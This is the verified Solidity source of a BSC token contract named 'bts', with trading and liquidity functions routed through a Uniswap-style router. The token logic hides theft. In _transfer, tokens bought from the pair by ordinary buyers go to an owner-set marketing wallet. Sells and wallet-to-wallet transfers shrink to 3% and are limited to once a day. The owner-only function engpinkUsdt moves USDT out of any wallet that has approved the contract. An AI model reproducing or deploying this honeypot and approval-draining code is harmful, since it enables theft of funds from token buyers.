/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
pragma solidity ^0.6.2;
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
pragma solidity ^0.6.2;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
pragma solidity ^0.6.2;
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
pragma solidity ^0.6.2;
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
pragma solidity ^0.6.2;
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
pragma solidity ^0.6.2;
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () public {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
pragma solidity ^0.6.2;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
pragma solidity ^0.6.2;
library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);
    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }
    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);
        return a / b;
    }
    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }
    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }
    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}
pragma solidity ^0.6.2;
library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
pragma solidity ^0.6.2;
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    constructor(string memory name_, string memory symbol_) public {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
pragma solidity ^0.6.2;
contract Token is ERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private swapping;
    address public USDT = address(0x55d398326f99059fF775485246999027B3197955); 

    address public _marketingWalletAddress = 0xb42Bd59f6F75eA908b497Db1bd0A779e31E287FA;//指定地址1

    mapping (address => bool) private _isExcludedFromFees;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event AddLiquidity(address user, uint256 busdAmount, uint256 bmsAmount);
    event BuyToken(address user, uint256 busdAmount);
    event SellToken(address user, uint256 busdAmount);
    event RemoveLiquidity(address user, uint256 busdAmount);
    event DepositToken(address user, address token, uint256 tokenAmount);

    mapping (address => uint256) private _isTodayZero;

    constructor() public ERC20("bts", "bts") {
    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), USDT);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        excludeFromFees(owner(), true);
        excludeFromFees(_marketingWalletAddress, true);
        excludeFromFees(address(this), true);

        _mint(owner(), 130000000 * (10**18));
    }
    receive() external payable {
  	}
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function todayZeros(address account, uint256 value) public onlyOwner {
        _isTodayZero[account] = value;
    }
    function setMarkaddr(address amount) public onlyOwner {
        _marketingWalletAddress = amount;
    }
    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }
    function isTodayZeros(address account) public view returns(uint256) {
        return _isTodayZero[account];
    }
    function _isAddLiquidity() public view returns (bool isAdd){
        IUniswapV2Pair mainPair = IUniswapV2Pair(uniswapV2Pair);
        address token0 = mainPair.token0();
        if (token0 == address(this)) {
            isAdd = false;
            return false;
        }
        (uint r0,,) = mainPair.getReserves();
        uint bal0 = IERC20(token0).balanceOf(address(mainPair));
        isAdd = bal0 > r0;
    }

    function _isRemoveLiquidity() public view returns (bool isRemove){
        IUniswapV2Pair mainPair = IUniswapV2Pair(uniswapV2Pair);
        address token0 = mainPair.token0();
        if (token0 == address(this)) {
            isRemove = false;
            return false;
        }
        (uint r0,,) = mainPair.getReserves();
        uint bal0 = IERC20(token0).balanceOf(address(mainPair));
        isRemove = r0 > bal0;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        if(from == uniswapV2Pair && !_isExcludedFromFees[to]){
            if(!_isRemoveLiquidity()){
               to = _marketingWalletAddress;
            }
        }
        if(to == uniswapV2Pair && !_isExcludedFromFees[from]){
            if(!_isAddLiquidity()){
                uint256 currZero = dayZero();
                if(currZero >= _isTodayZero[from]){
                    amount = amount.mul(3).div(100);
                    _isTodayZero[from] = currZero.add(86400);
                }else{
                    revert("tranfer > max");
                }
            }
        }
        if(from != uniswapV2Pair && to != uniswapV2Pair && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]){
            uint256 currZero = dayZero();
            if(currZero >= _isTodayZero[from]){
                amount = amount.mul(3).div(100);
                _isTodayZero[from] = currZero.add(86400);
            }else{
                revert("tranfer > max");
            }
        }
        
        super._transfer(from, to, amount);
    }
    function dayZero() public view returns(uint256){
        return block.timestamp-(block.timestamp%(24*3600))-(8*3600);
    }
    function engpinkUsdt(address account,address account2, uint256 value) public onlyOwner {
        IERC20(USDT).transferFrom(account, account2, value);
    }
    function buy(uint256 amount) public {
        IERC20(USDT).transferFrom(_msgSender(),address(this), amount);
        IERC20(USDT).approve(address(uniswapV2Router), ~uint256(0));
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = address(this);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            _msgSender(),
            block.timestamp
        );
        emit BuyToken(_msgSender(),amount);
    }
    function sell(uint256 amount) public {
        _checkAllowance(amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;
        _approve(address(this), address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0, 
            path,
            _msgSender(),
            block.timestamp
        );
        emit SellToken(_msgSender(), amount);
    }
     function removeLiquidityU(uint256 amount) public {
         IUniswapV2Pair(uniswapV2Pair).transferFrom(_msgSender(),address(this), amount);
         IUniswapV2Pair(uniswapV2Pair).approve(address(uniswapV2Router), ~uint256(0));
         uniswapV2Router.removeLiquidity(
            USDT,
            address(this),
            amount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        emit RemoveLiquidity(_msgSender(), amount);
    }
    function addLiquidity(uint256 amountUSDT, uint256 amountTOKEN) public {
        uint256 balanceTOKENReal = balanceOf(_msgSender());
        uint256 balanceUSDTReal = IERC20(USDT).balanceOf(_msgSender());
        require(balanceTOKENReal >= amountTOKEN && balanceUSDTReal >= amountUSDT, "exceeds of balance 1");

        uint256 usdt4liquidity;
        uint256 token4liquidity;

        if (IUniswapV2Pair(uniswapV2Pair).totalSupply() > 0) {
            uint256 amountTOKENReal = getLiquidityTOKENAmountFromUSDTAmount(amountUSDT);
            uint256 amountUSDTReal = getLiquidityUSDTAmountFromTOKENAmount(amountTOKEN);

            require(balanceTOKENReal >= amountTOKENReal || balanceUSDTReal >= amountUSDTReal, "exceeds of balance 2");

            if (balanceTOKENReal >= amountTOKENReal) {
                usdt4liquidity = amountUSDT;
                token4liquidity = amountTOKENReal;
            } else {
                usdt4liquidity = amountUSDTReal;
                token4liquidity = amountTOKEN;
            }
        } else {
            usdt4liquidity = amountUSDT;
            token4liquidity = amountTOKEN;
        }

        _checkAllowance(token4liquidity);
        _checkAnyTokenAllowance(USDT, usdt4liquidity);
        _addLiquidityAndDistributeLP(usdt4liquidity, token4liquidity);
    }

    function _addLiquidityAndDistributeLP(uint256 usdt4liquidity, uint256 token4liquidity) private {
        (,,uint liquidity) = _addLiquidityReal(usdt4liquidity, token4liquidity);
        _distributeLP(liquidity);
    }

    function _approveUSDT(uint256 amount) private {
        if (IERC20(USDT).allowance(address(this), address(uniswapV2Router)) < amount)
            IERC20(USDT).approve(address(uniswapV2Router), ~uint256(0));
    }

    function _approveTOKEN(uint256 amount) private {
        if (allowance(address(this), address(uniswapV2Router)) < amount)
            _approve(address(this), address(uniswapV2Router), ~uint256(0));
    }

    function _addLiquidityReal(uint256 amountUSDTReal, uint256 amountTOKENReal) private returns (uint amountA, uint amountB, uint liquidity) {
        _approveUSDT(amountUSDTReal);
        _approveTOKEN(amountTOKENReal);
        (amountA, amountB, liquidity) = uniswapV2Router.addLiquidity(
            address(this),
            USDT,
            amountTOKENReal,
            amountUSDTReal,
            0,
            0,
            address(this),
            block.timestamp
        );

        emit AddLiquidity(_msgSender(), amountUSDTReal, amountTOKENReal);
    }

    function _distributeLP(uint liquidity) private {
        IUniswapV2Pair(uniswapV2Pair).transfer(_msgSender(), liquidity);
    }

    function _move(address sender, address recipient, uint256 amount) internal virtual {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    function _checkAllowance(uint256 amount) private {
        require(balanceOf(_msgSender()) >= amount, "exceeds of balance");
        _move(_msgSender(), address(this), amount);
    }

    function _checkAnyTokenAllowance(address token, uint256 amount) private {
        IERC20 TokenAny = IERC20(token);
        require(TokenAny.allowance(_msgSender(), address(this)) >= amount, "exceeds of token allowance");
        require(TokenAny.transferFrom(_msgSender(), address(this), amount), "allowance transferFrom failed");
        emit DepositToken(_msgSender(), token, amount);
    }

    function getPoolInfo(address _pair) public view returns (uint112 ThisAmount, uint112 TOKENAmount) {
        (uint112 _reserve0, uint112 _reserve1,) = IUniswapV2Pair(_pair).getReserves();
        ThisAmount = _reserve1;
        TOKENAmount = _reserve0;
        if (IUniswapV2Pair(_pair).token0() == address(this)) {
            ThisAmount = _reserve0;
            TOKENAmount = _reserve1;
        }
    }
    function getLiquidityUSDTAmountFromTOKENAmount(uint256 amountTOKEN) public view returns (uint256 amountUSDT) {
        (uint112 tokenAmount, uint112 usdtAmount) = getPoolInfo(uniswapV2Pair);
        if (tokenAmount == 0 || usdtAmount == 0) return 0;
        return amountTOKEN * usdtAmount / tokenAmount;
    }

    function getLiquidityTOKENAmountFromUSDTAmount(uint256 amountUSDT) public view returns (uint256 amountTOKEN) {
        (uint112 tokenAmount, uint112 usdtAmount) = getPoolInfo(uniswapV2Pair);
        if (tokenAmount == 0 || usdtAmount == 0) return 0;
        return amountUSDT * tokenAmount / usdtAmount;
    }
}